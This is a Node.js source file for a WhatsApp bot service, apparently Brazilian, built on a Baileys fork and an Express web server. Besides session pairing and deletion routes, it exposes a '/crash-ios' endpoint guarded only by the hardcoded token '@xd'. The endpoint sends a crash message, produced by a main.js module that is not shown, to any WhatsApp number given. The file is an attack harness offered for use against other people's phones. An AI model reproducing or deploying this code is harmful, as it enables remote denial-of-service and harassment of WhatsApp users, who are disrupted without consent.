// index.js
const {
  generateWAMessageFromContent,
  getAggregateVotesInPollMessage,
  downloadContentFromMessage,
  useMultiFileAuthState,
  generateWAMessage,
  makeInMemoryStore,
  DisconnectReason,
  areJidsSameUser,
  getContentType,
  decryptPollVote,
  makeWASocket,
  relayMessage,
  jidDecode,
  Browsers,
  proto
} = require("@angstvorfrauen/baileys");
const crypto = require("crypto");
const path = require("path");
const pino = require("pino");
const os = require("os");
const fs = require("fs");
const Boom = require("@hapi/boom");
const express = require("express");
const app = express();
const main = require("./main.js");

app.use(express.json());

// === BAILEYS ===
let sock;
let sessionExists = false;

async function connectBot() {
  const { state, saveCreds } = await useMultiFileAuthState("./database/Session");
  sock = makeWASocket({
    printQRInTerminal: false,
    auth: state,
    logger: pino({ level: "silent" }),
  });

  sessionExists = sock.authState.creds.registered;

  sock.ev.on("messages.upsert", async chatUpdate => {
    let message = chatUpdate.messages[0];
    if (!message.message) return;
    message.message = (Object.keys(message.message)[0] === "ephemeralMessage")
        ? message.message.ephemeralMessage.message
        : message.message;
    if (message.key && message.key.remoteJid === "status@broadcast") return;
    if (message.key.id.startsWith("BAE5")) return;
    require("./main.js")(sock, message, chatUpdate);
  });

  sock.decodeJid = (jid) => {
    if (!jid) return jid;
    if (/:\d+@/gi.test(jid)) {
      let decode = jidDecode(jid) || {};
      return (decode.user && decode.server ? `${decode.user}@${decode.server}` : jid);
    } else {
      return jid;
    }
  };

  sock.public = true;

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "close") {
      let reason = Boom.boomify(lastDisconnect?.error)?.output.statusCode;
      sessionExists = false;
      switch (reason) {
        case DisconnectReason.badSession:
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
          break;
        case DisconnectReason.loggedOut:
          fs.rmSync("./database/Session", { recursive: true, force: true });
          connectBot();
          break;
        default:
          connectBot();
      }
    } else if (connection === "open") {
      sessionExists = true;
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
}
connectBot();

// === ROTAS WEB ===
app.get('/', (req, res) => {
  res.json({
    status: "running",
    apis: {
      "/connect?token=@xd&query=<numero>": "Gera código de pareamento se não houver sessão",
      "/deleteSession?token=@xd": "Deleta a sessão atual",
      "/crash-ios?token=@xd&query=<numero>": "Envia crash para o número especificado"
    }
  });
});

// === APIs ===
app.get('/connect', async (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Invalid token' });
  if (sessionExists) return res.status(400).json({ error: 'Session already exists' });
  const phoneNumber = req.query.query.replace(/[^0-9]/g, "");
  let code = await sock.requestPairingCode(phoneNumber, "AAAAAAAA");
  code = code?.match(/.{1,4}/g)?.join("-") || code;
  res.json({ code: code });
});

app.get('/deleteSession', (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Invalid token' });
  fs.rmSync("./database/Session", { recursive: true, force: true });
  connectBot();
  res.json({ success: true });
});

app.get('/crash-ios', async (req, res) => {
  const token = req.query.token;
  if (token !== '@xd') return res.status(401).json({ error: 'Invalid token' });
  const query = req.query.query;
  if (!query) return res.status(400).json({ error: 'Missing query parameter' });
  const target = query.replace(/[^0-9]/g, "") + '@s.whatsapp.net';
  try {
    await main.sendCrash(sock, target);
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ error: 'Failed to send crash' });
  }
});

// === INICIAR SERVIDOR ===
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
